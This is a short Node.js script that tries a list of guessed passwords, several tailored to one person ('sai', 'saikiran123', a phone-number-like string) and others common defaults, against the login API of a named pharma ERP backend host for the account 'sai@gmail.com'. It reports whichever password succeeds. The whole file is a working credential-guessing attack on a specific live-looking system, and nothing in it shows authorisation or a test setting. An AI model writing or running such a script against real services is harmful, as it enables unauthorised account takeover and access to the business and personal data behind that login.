const https = require('https');

const hostname = 'pharma-erp-pharma-backend.rrh5yv.easypanel.host';
const passwords = [
  '9381803746',
  'MR002',
  'sai',
  'sai123',
  'sai@123',
  'saikiran',
  'saikiran123',
  'password',
  '123456',
  '12345678',
  'admin123',
  'admin'
];

function post(path, body) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify(body);
    const req = https.request({
      hostname,
      path,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    }, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        resolve({ status: res.statusCode, body: data });
      });
    });
    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

async function run() {
  for (const pw of passwords) {
    console.log(`Trying sai@gmail.com with password: ${pw}...`);
    try {
      const res = await post('/api/auth/login', { email: 'sai@gmail.com', password: pw });
      if (res.status === 200 || res.status === 201) {
        console.log(`Success! Password is: ${pw}`);
        console.log('Response:', res.body);
        return;
      } else {
        console.log(`Failed: status ${res.status}`);
      }
    } catch (err) {
      console.log(`Error: ${err.message}`);
    }
  }
}

run();
